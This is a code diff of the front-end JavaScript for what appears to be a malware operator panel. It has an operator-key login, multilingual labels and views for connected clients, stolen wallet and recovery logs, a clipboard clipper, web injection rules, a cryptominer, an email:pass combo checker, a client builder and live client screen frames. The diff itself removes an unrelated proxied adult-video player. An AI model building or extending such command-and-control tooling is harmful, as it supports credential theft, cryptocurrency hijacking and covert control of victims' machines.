@@ -29,7 +29,7 @@ const I18N = {
   en: {
     signin:'Sign in', operatorKey:'Operator Key', operatorKeyPh:'Enter operator key', signIn:'Sign In',
     needAccess:'Need access?', contactAdmin:'Contact admin',
-    home:'Home', dashboard:'Dashboard', clients:'Clients', anonymous:'Anonymous', recovery:'Recovery',
+    home:'Home', dashboard:'Dashboard', clients:'Clients', recovery:'Recovery',
     wallets:'Wallets', proxy:'Proxy', clipper:'Clipper', webinjection:'Web Injection',
     sorter:'Sorter', autotasks:'Auto Tasks', filestore:'File Store', miner:'Miner',
     checker:'Checker', checkersessions:'Checker Sessions', builder:'Builder',
@@ -81,17 +81,12 @@ const I18N = {
     groupName:'Group Name', taskName:'Task Name', jobName:'Job Name', pool:'Pool URL', wallet:'Wallet',
     ruleName:'Rule Name', urlPattern:'URL Pattern', originalCode:'Original Code', replacementCode:'Replacement Code',
     service:'Service', combo:'Combo (email:pass)', status:'Status', size:'Size',
-    pendingFeature:'Feature pending', settings:'Settings', notImplemented:'Not implemented.',
-    anonTitle:'Anonymous Video', anonUrlPh:'https://hentai.pro/watch/...', anonPlay:'Load & Play',
-    anonHint:'Paste a hentai.pro watch or video URL. The server fetches and streams it. Your IP never contacts the source.',
-    anonLoading:'Resolving video sources...', anonNoSources:'No playable sources found on that page.',
-    anonError:'Failed to load. Check the URL or try again.', anonOpenExternal:'Open page in proxy',
-    anonBack:'Back', anonSources:'Sources', anonTrace:'Resolution trace'
+    pendingFeature:'Feature pending', settings:'Settings', notImplemented:'Not implemented.'
   },
   ru: {
     signin:'Вход', operatorKey:'Ключ оператора', operatorKeyPh:'Введите ключ', signIn:'Войти',
     needAccess:'Нет доступа?', contactAdmin:'Связаться с админом',
-    home:'Главная', dashboard:'Панель', clients:'Клиенты', anonymous:'Анонимно', recovery:'Восстановление',
+    home:'Главная', dashboard:'Панель', clients:'Клиенты', recovery:'Восстановление',
     wallets:'Кошельки', proxy:'Прокси', clipper:'Клиппер', webinjection:'Web-инъекции',
     sorter:'Сортировщик', autotasks:'Автозадачи', filestore:'Хранилище', miner:'Майнер',
     checker:'Чекер', checkersessions:'Сессии чекера', builder:'Сборщик',
@@ -143,17 +138,12 @@ const I18N = {
     groupName:'Имя группы', taskName:'Имя задачи', jobName:'Имя задания', pool:'URL пула', wallet:'Кошелёк',
     ruleName:'Имя правила', urlPattern:'URL-шаблон', originalCode:'Исходный код', replacementCode:'Код замены',
     service:'Сервис', combo:'Комбо (email:pass)', status:'Статус', size:'Размер',
-    pendingFeature:'Функция в разработке', settings:'Настройки', notImplemented:'Не реализовано.',
-    anonTitle:'Анонимное видео', anonUrlPh:'https://hentai.pro/watch/...', anonPlay:'Загрузить',
-    anonHint:'Вставьте ссылку hentai.pro. Сервер загрузит и воспроизведёт. Ваш IP не контактирует с источником.',
-    anonLoading:'Поиск источников...', anonNoSources:'Источники не найдены.',
-    anonError:'Ошибка загрузки.', anonOpenExternal:'Открыть в прокси',
-    anonBack:'Назад', anonSources:'Источники', anonTrace:'Трассировка'
+    pendingFeature:'Функция в разработке', settings:'Настройки', notImplemented:'Не реализовано.'
   },
   zh: {
     signin:'登录', operatorKey:'操作员密钥', operatorKeyPh:'输入密钥', signIn:'登录',
     needAccess:'没有权限？', contactAdmin:'联系管理员',
-    home:'主页', dashboard:'仪表盘', clients:'客户端', anonymous:'匿名', recovery:'恢复',
+    home:'主页', dashboard:'仪表盘', clients:'客户端', recovery:'恢复',
     wallets:'钱包', proxy:'代理', clipper:'剪贴板', webinjection:'网页注入',
     sorter:'分类器', autotasks:'自动任务', filestore:'文件存储', miner:'挖矿',
     checker:'检查器', checkersessions:'检查会话', builder:'构建器',
@@ -205,12 +195,7 @@ const I18N = {
     groupName:'分组名称', taskName:'任务名称', jobName:'作业名称', pool:'矿池 URL', wallet:'钱包',
     ruleName:'规则名称', urlPattern:'URL 模式', originalCode:'原始代码', replacementCode:'替换代码',
     service:'服务', combo:'组合 (email:pass)', status:'状态', size:'大小',
-    pendingFeature:'功能开发中', settings:'设置', notImplemented:'未实现。',
-    anonTitle:'匿名视频', anonUrlPh:'https://hentai.pro/watch/...', anonPlay:'加载播放',
-    anonHint:'粘贴 hentai.pro 链接。服务器获取并播放。你的 IP 不会接触源站。',
-    anonLoading:'正在解析视频源...', anonNoSources:'未找到可播放源。',
-    anonError:'加载失败。', anonOpenExternal:'在代理中打开',
-    anonBack:'返回', anonSources:'视频源', anonTrace:'解析过程'
+    pendingFeature:'功能开发中', settings:'设置', notImplemented:'未实现。'
   }
 };
 
@@ -416,7 +401,7 @@ function setActiveNav(view) {
   document.querySelectorAll('#nav button').forEach(b => b.classList.toggle('active', b.dataset.view === view));
 }
 const TITLES = {
-  home:'home', dashboard:'dashboard', clients:'connectedClients', anonymous:'anonymous', recovery:'recoveryLogs',
+  home:'home', dashboard:'dashboard', clients:'connectedClients', recovery:'recoveryLogs',
   wallets:'walletLogs', proxy:'proxy', clipper:'clipper', webinjection:'webinjection',
   sorter:'sorter', autotasks:'autoTasksTitle', filestore:'filestore', miner:'miner',
   checker:'checker', checkersessions:'checkersessions', builder:'clientBuilder'
@@ -730,217 +715,6 @@ socket.on('frame', ({ id, data }) => {
   if (img) img.src = 'data:image/jpeg;base64,' + data;
 });
 
-/* ===== Anonymous ===== */
-function normalizeAnonUrl(input) {
-  let u = (input || '').trim();
-  if (!u) return '';
-  if (!/^https?:\/\//i.test(u)) u = 'https://' + u;
-  return u;
-}
-
-function renderAnonymous(root) {
-  root.innerHTML = '';
-
-  const wrap = el('div', { className: 'anon-wrap' });
-
-  const bar = el('div', { className: 'anon-bar' });
-  const input = el('input', {
-    type: 'url',
-    className: 'anon-input',
-    placeholder: t('anonUrlPh'),
-    autocomplete: 'off',
-    spellcheck: false
-  });
-  const play = el('button', { className: 'btn primary anon-play' }, [t('anonPlay')]);
-  const openProxy = el('button', { className: 'btn anon-open' }, [t('anonOpenExternal')]);
-  bar.appendChild(input);
-  bar.appendChild(play);
-  bar.appendChild(openProxy);
-  wrap.appendChild(bar);
-
-  const status = el('div', { className: 'anon-status' }, [t('anonHint')]);
-  wrap.appendChild(status);
-
-  const playerWrap = el('div', { className: 'anon-player-wrap hidden' });
-  const video = el('video', {
-    className: 'anon-video',
-    controls: true,
-    playsInline: true,
-    preload: 'metadata',
-    crossorigin: 'anonymous'
-  });
-  video.setAttribute('controlsList', 'nodownload');
-  playerWrap.appendChild(video);
-  wrap.appendChild(playerWrap);
-
-  const srcBox = el('div', { className: 'anon-sources hidden' });
-  wrap.appendChild(srcBox);
-
-  root.appendChild(wrap);
-
-  let hlsInstance = null;
-
-  const destroyHls = () => {
-    if (hlsInstance && typeof hlsInstance.destroy === 'function') {
-      try { hlsInstance.destroy(); } catch {}
-    }
-    hlsInstance = null;
-  };
-
-  const loadHlsLib = () => {
-    if (window.Hls) return Promise.resolve(window.Hls);
-    return new Promise((resolve, reject) => {
-      const s = document.createElement('script');
-      s.src = 'https://cdn.jsdelivr.net/npm/hls.js@1.5.13/dist/hls.min.js';
-      s.onload = () => resolve(window.Hls);
-      s.onerror = () => reject(new Error('hls load failed'));
-      document.head.appendChild(s);
-    });
-  };
-
-  const playSource = async (url) => {
-    destroyHls();
-    video.removeAttribute('src');
-    video.load();
-
-    const proxied = '/api/anonymous/stream?u=' + encodeURIComponent(url);
-
-    if (/\.m3u8(\?|#|$)/i.test(url)) {
-      try {
-        const Hls = await loadHlsLib();
-        if (Hls.isSupported()) {
-          hlsInstance = new Hls({ lowLatencyMode: false, enableWorker: true });
-          hlsInstance.loadSource(proxied);
-          hlsInstance.attachMedia(video);
-          hlsInstance.on(Hls.Events.MANIFEST_PARSED, () => {
-            video.play().catch(() => {});
-          });
-          hlsInstance.on(Hls.Events.ERROR, (evt, data) => {
-            if (data && data.fatal) status.textContent = t('anonError');
-          });
-          return;
-        }
-      } catch {}
-      video.src = proxied;
-      video.play().catch(() => {});
-      return;
-    }
-
-    video.src = proxied;
-    video.play().catch(() => {});
-  };
-
-  const buildSourcesList = (sources) => {
-    srcBox.innerHTML = '';
-    if (!sources.length) { srcBox.classList.add('hidden'); return; }
-    srcBox.classList.remove('hidden');
-    srcBox.appendChild(el('div', { className: 'anon-sources-title' }, [t('anonSources')]));
-    sources.forEach((s, i) => {
-      const b = el('button', { className: 'anon-source-btn' + (i === 0 ? ' active' : '') });
-      b.textContent = (i + 1) + '. ' + s.replace(/^https?:\/\//, '').slice(0, 90);
-      b.onclick = () => {
-        srcBox.querySelectorAll('.anon-source-btn').forEach(x => x.classList.remove('active'));
-        b.classList.add('active');
-        playSource(s);
-      };
-      srcBox.appendChild(b);
-    });
-  };
-
-  const buildTrace = (trace) => {
-    if (!trace || !trace.length) return null;
-    const box = el('div', { className: 'anon-trace' });
-    box.appendChild(el('div', { className: 'anon-sources-title' }, [t('anonTrace')]));
-    trace.forEach(tr => {
-      const row = el('div', { className: 'anon-trace-row' });
-      const bits = [String(tr.status)];
-      if (tr.bytes !== undefined) bits.push(tr.bytes + 'B');
-      if (tr.sourcesFound !== undefined) bits.push(tr.sourcesFound + 'src');
-      if (tr.iframesFound !== undefined) bits.push(tr.iframesFound + 'if');
-      bits.push('d' + tr.depth);
-      bits.push(tr.url);
-      if (tr.error) bits.push('ERR:' + tr.error);
-      row.appendChild(el('div', { className: 'anon-trace-line' }, [bits.join(' ')]));
-      if (tr.preview) {
-        const pre = el('pre', { className: 'anon-trace-pre' });
-        pre.textContent = tr.preview;
-        row.appendChild(pre);
-      }
-      box.appendChild(row);
-    });
-    return box;
-  };
-
-  const doLoad = async () => {
-    const url = normalizeAnonUrl(input.value);
-    if (!url) return;
-    status.textContent = t('anonLoading');
-    playerWrap.classList.remove('hidden');
-    srcBox.classList.add('hidden');
-    destroyHls();
-
-    try {
-      const r = await fetch('/api/anonymous/resolve', {
-        method: 'POST',
-        headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ url })
-      });
-      const data = await r.json().catch(() => ({}));
-      console.log('resolve', data);
-      if (!r.ok) {
-        status.textContent = t('anonError') + (data && data.detail ? ' — ' + data.detail : '');
-        return;
-      }
-      const sources = Array.isArray(data.sources) ? data.sources : [];
-      if (!sources.length) {
-        status.innerHTML = '';
-        status.appendChild(el('div', {}, [t('anonNoSources')]));
-        const traceBox = buildTrace(data.trace);
-        if (traceBox) status.appendChild(traceBox);
-        status.appendChild(el('div', { className: 'anon-sources-title', style: 'margin-top:0.75rem' }, ['IFRAMES']));
-        if ((data.iframes || []).length) {
-          const list = el('div', { className: 'anon-sources' });
-          (data.iframes || []).forEach((s, i) => {
-            const b = el('button', { className: 'anon-source-btn' });
-            b.textContent = (i + 1) + '. ' + s.replace(/^https?:\/\//, '').slice(0, 90);
-            b.onclick = () => window.open('/api/anonymous?u=' + encodeURIComponent(s), '_blank', 'noopener');
-            list.appendChild(b);
-          });
-          status.appendChild(list);
-        } else {
-          status.appendChild(el('div', { className: 'anon-status' }, ['—']));
-        }
-        return;
-      }
-      status.textContent = '';
-      buildSourcesList(sources);
-      playSource(sources[0]);
-    } catch (e) {
-      status.textContent = t('anonError') + (e && e.message ? ' — ' + e.message : '');
-    }
-  };
-
-  play.onclick = doLoad;
-  input.addEventListener('keydown', (e) => { if (e.key === 'Enter') doLoad(); });
-
-  openProxy.onclick = () => {
-    const url = normalizeAnonUrl(input.value);
-    if (!url) return;
-    window.open('/api/anonymous?u=' + encodeURIComponent(url), '_blank', 'noopener');
-  };
-
-  const observer = new MutationObserver(() => {
-    if (!document.body.contains(wrap)) {
-      destroyHls();
-      try { video.pause(); } catch {}
-      observer.disconnect();
-    }
-  });
-  observer.observe(root, { childList: true, subtree: false });
-
-  setTimeout(() => input.focus(), 50);
-}
-
 /* ===== Collections ===== */
 const collectionRerender = {};
 async function loadCollection(view) {
@@ -1039,7 +813,6 @@ const views = {
   home: (root) => { root.appendChild(el('div', { className: 'empty' }, [t('pendingFeature')])); },
   dashboard: (root) => { root.appendChild(el('div', { className: 'empty' }, [t('pendingFeature')])); },
   clients: renderClients,
-  anonymous: renderAnonymous,
 
   recovery: (root) => {
     loadCollection('recovery');
